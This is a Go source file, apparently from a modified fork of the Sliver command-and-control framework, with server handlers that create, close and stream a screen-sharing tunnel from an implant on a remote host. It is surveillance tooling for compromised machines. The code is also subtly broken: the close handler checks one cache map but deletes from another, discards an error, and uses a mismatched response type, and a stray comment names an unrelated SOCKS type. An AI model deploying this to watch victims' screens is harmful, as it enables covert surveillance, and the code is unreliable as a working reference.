package rpc

import (
	"context"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"google.golang.org/protobuf/proto"
	"sync"
)

var (
	// SessionID->Tunnels[TunnelID]->Tunnel->Cache map[uint64]*matrixpb.SocksData{}
	toImplantCacheShare = map[uint64]sync.Map{}

	// SessionID->Tunnels[TunnelID]->Tunnel->Cache
	fromImplantCacheShare = map[uint64]map[uint64]*sliverpb.ScreenShareData{}
)

// CreateScreenShare - Create a screen sharing channel
func (s *Server) CreateScreenShare(ctx context.Context, req *sliverpb.ScreenShare) (*sliverpb.ScreenShare, error) {
	session := core.Sessions.Get(req.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	tunnel := core.Tunnels.Create(session.ID)
	if tunnel == nil {
		return nil, ErrTunnelInitFailure
	}
	toImplantCacheShare[tunnel.ID] = sync.Map{}
	fromImplantCacheShare[tunnel.ID] = map[uint64]*sliverpb.ScreenShareData{}
	return &sliverpb.ScreenShare{
		SessionID: session.ID,
		TunnelID:  tunnel.ID,
	}, nil
}

// CloseScreenShare - Close a screen sharing channel
func (rpc *Server) CloseScreenShare(ctx context.Context, req *sliverpb.ScreenShare) (*commonpb.Empty, error) {
	err := core.Tunnels.Close(req.TunnelID)
	resp := &sliverpb.Screenshot{Response: &commonpb.Response{}}

	err = rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}

	if _, ok := fromImplantCacheShare[req.TunnelID]; ok {
		delete(fromImplantCacheSocks, req.TunnelID)
	}

	if err != nil {
		return nil, err
	}
	return &commonpb.Empty{}, nil
}

func (s *Server) ScreenShare(ssd *sliverpb.ScreenShareData, stream rpcpb.SliverRPC_ScreenShareServer) error {
	for {
		share := core.Tunnels.Get(ssd.TunnelID)
		if share == nil {
			return nil
		}
		ScreenShareDataReq := &sliverpb.ScreenShareData{
			Type:     ssd.Type,
			TunnelID: ssd.TunnelID,
		}
		data, _ := proto.Marshal(ScreenShareDataReq)
		session := core.Sessions.Get(ssd.Request.SessionID)
		session.Connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgScreenShareData,
			Data: data,
		}
		for tunnelData := range share.FromImplant {
			tunnelLog.Debugf("Tunnel %d: From client %d byte(s)",
				tunnelData.TunnelID, len(tunnelData.Data))
			stream.Send(&sliverpb.ScreenShareData{
				TunnelID: tunnelData.TunnelID,
				Data:     tunnelData.Data,
			})

		}

	}
}
